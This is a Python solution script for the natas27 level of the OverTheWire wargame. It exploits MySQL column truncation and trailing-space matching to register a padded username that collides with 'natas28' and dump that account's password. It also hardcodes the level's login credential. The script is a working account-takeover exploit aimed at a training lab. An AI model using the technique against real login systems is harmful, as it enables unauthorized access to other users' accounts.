import urllib.request, urllib.parse, base64, re
# natas27: trim() guards createUser() but substr(...,0,64) cuts silently.
# Register "natas28"+57 spaces+"x" (65 chars, trim() no-op) -> the row stores
# "natas28"+57 spaces with OUR password. Logging in with "natas28"+57 spaces
# matches the row (MySQL = ignores trailing spaces) and dumpData(trim($usr))
# selects the real natas28 row and prints it.
auth = "Basic " + base64.b64encode(b"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV").decode()
H = "http://natas27.natas.labs.overthewire.org/"
def post(usr, pw):
    d = urllib.parse.urlencode({"username": usr, "password": pw}).encode()
    b = urllib.request.urlopen(urllib.request.Request(H, data=d, headers={"Authorization": auth}), timeout=10).read().decode("utf-8", "replace")
    return b[b.find('<div id="content">'):]
reg = "natas28" + " " * 57 + "x"
login = "natas28" + " " * 57
print("$ register:", re.sub('<[^>]+>', ' ', post(reg, ""))[:200].strip())
print("$ login:   ", re.sub('<[^>]+>', ' ', post(login, ""))[:400].strip())

